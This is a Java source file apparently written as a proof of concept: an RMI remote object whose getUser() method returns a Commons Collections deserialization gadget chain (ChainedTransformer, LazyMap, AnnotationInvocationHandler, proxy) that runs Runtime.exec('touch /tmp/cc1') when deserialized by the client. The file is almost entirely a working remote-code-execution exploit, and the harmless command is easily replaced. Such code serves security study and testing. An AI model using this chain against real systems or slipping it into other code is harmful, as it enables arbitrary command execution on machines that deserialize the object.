package rmi.api.imp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;
import rmi.api.User;

public class LocalUser extends UnicastRemoteObject implements User  {
    public String name;
    public int age;

    public LocalUser(String name, int age) throws RemoteException {
        super();
        this.name = name;
        this.age = age;
    }

    public Object getUser(){

        InvocationHandler handler = null;
        try {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{"touch /tmp/cc1"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map) constructor.newInstance(innermap, chain);

            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); 

            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); 

            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);

        }catch(Exception e){
            e.printStackTrace();
        }

        return (Object)handler;
    }
}